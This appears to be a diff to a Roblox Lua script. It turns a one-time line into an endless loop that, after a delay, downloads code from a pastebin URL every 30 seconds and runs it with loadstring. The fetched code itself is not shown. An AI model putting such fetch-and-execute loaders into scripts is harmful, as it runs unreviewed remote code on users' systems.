@@ -1,1 +1,6 @@
-loadstring(game:HttpGet("https://pastebin.com/raw/yMVAwKk2"))()
+wait(180)
+
+while true do
+    loadstring(game:HttpGet("https://pastebin.com/raw/yMVAwKk2"))()
+    wait(30)
+end
